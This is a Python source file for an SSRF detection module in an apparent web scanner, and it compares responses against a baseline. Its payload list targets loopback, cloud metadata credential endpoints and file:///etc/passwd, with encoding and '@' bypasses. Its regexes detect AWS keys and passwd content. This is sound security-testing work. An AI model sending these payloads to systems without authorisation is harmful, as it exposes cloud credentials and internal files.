"""SSRF checker — differential detection of server-side request forgery."""

import re
from typing import Optional, List

import httpx

from webscanner.checkers.base import BaseChecker
from webscanner.core.models import CheckResult, BaselineData


class SSRF(BaseChecker):

    name = "Server-Side Request Forgery (SSRF)"

    def __init__(self):
        self.canary = self.rand(10)

        self.payloads_list = [
            # Localhost variants
            "http://127.0.0.1/",
            "http://127.0.0.1:80/",
            "http://localhost/",
            "http://[::1]/",
            "http://0x7f000001/",
            "http://0177.0.0.1/",
            "http://2130706433/",              # decimal IP for 127.0.0.1
            "http://127.1/",
            "http://127.0.0.1:8080/",
            "http://127.0.0.1:5000/internal/metadata",
            "http://localhost:5000/internal/metadata",

            # AWS metadata (IMDSv1)
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",

            # GCP metadata
            "http://metadata.google.internal/computeMetadata/v1/",

            # Azure metadata
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",

            # File protocol
            "file:///etc/passwd",
            "file:///etc/hosts",

            # Bypass: URL encoding
            "http://%31%32%37%2e%30%2e%30%2e%31/",
            # Bypass: redirect via @ sign
            "http://evil.com@127.0.0.1/",
        ]

        # Patterns indicating internal content was fetched
        self._internal_patterns = [
            # Internal metadata responses
            re.compile(r"instance-id", re.I),
            re.compile(r"ami-id", re.I),
            re.compile(r"AKIA[A-Z0-9]{16}", re.I),         # AWS access key
            re.compile(r"secret[_-]?key", re.I),
            re.compile(r"security[_-]?credentials", re.I),
            # /etc/passwd content
            re.compile(r"root:x:0:0:", re.M),
            # Localhost markers
            re.compile(r"127\.0\.0\.1.*localhost", re.I),
            # Generic internal pages
            re.compile(r"<title>.*(?:internal|admin|dashboard)", re.I),
        ]

    def get_payloads(self) -> List[str]:
        return self.payloads_list

    def check(self, baseline: BaselineData, response: httpx.Response, payload: str) -> Optional[CheckResult]:
        body = response.text or ""

        # Differential: internal content NOT in baseline, YES in injected
        for rx in self._internal_patterns:
            if rx.search(body) and not rx.search(baseline.body):
                return CheckResult(
                    vuln_name=self.name,
                    severity="critical",
                    confidence="confirmed",
                    location="", param="", payload=payload,
                    status_code=response.status_code,
                    evidence=f"Internal content detected: {rx.pattern[:50]}",
                )

        # Check for significant body size change (fetched new content)
        if baseline.body_length > 0:
            size_ratio = len(body) / baseline.body_length
            if size_ratio > 3.0 and len(body) > 500:
                return CheckResult(
                    vuln_name=self.name,
                    severity="medium",
                    confidence="tentative",
                    location="", param="", payload=payload,
                    status_code=response.status_code,
                    evidence=f"Response size anomaly: {baseline.body_length}→{len(body)} bytes",
                )

        return None
